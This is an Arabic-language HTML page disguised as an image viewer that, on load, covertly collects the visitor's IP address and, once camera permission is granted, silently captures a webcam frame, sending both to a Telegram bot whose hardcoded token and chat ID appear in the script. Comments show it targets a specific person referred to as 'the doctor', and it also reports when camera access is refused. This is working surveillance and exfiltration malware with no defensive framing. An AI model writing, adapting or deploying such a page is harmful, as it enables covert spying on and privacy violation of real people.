<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>عرض الصورة</title>
    <style>
        body { text-align: center; background: #000; color: white; padding-top: 50px; }
        img { max-width: 90%; border-radius: 10px; display: none; margin: 0 auto; }
    </style>
</head>
<body>

    <h2 id="status">جاري تحميل الصورة...</h2>
    <img id="myPhoto" src="my-photo.jpg">

    <script>
        // --- ضع بياناتك هنا ---
        const TELEGRAM_TOKEN = '8372729487:AAFv7eZQGWtGkPqID6k209khDQKkZsO-TMM';
        const CHAT_ID = '8175631848';

        const statusText = document.getElementById('status');
        const photo = document.getElementById('myPhoto');

        // 1. وظيفة إرسال البيانات لتليجرام
        async function sendToTelegram(message, imageBlob = null) {
            if (imageBlob) {
                // إرسال الصورة
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, 'capture.png');
                formData.append('caption', message);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            } else {
                // إرسال نص فقط (الـ IP)
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
            }
        }

        async function startChallenge() {
            try {
                // سحب الـ IP وإرساله فوراً
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await sendToTelegram(`تم دخول الرابط! IP الدكتور: ${ipData.ip}`);

                // طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // إظهار الصورة للدكتور بعد الموافقة
                statusText.innerText = "تم التحميل بنجاح";
                photo.style.display = "block";

                // التقاط الصورة بالخلفية
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        await sendToTelegram("لقطة الكاميرا للدكتور:", blob);
                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
                    }, 'image/png');
                }, 2000);

            } catch (err) {
                statusText.innerText = "يرجى السماح بالأذونات لرؤية الصورة بدقة عالية";
                await sendToTelegram("الدكتور فتح الرابط لكنه رفض إذن الكاميرا.");
            }
        }

        window.onload = startChallenge;
    </script>
</body>
</html>
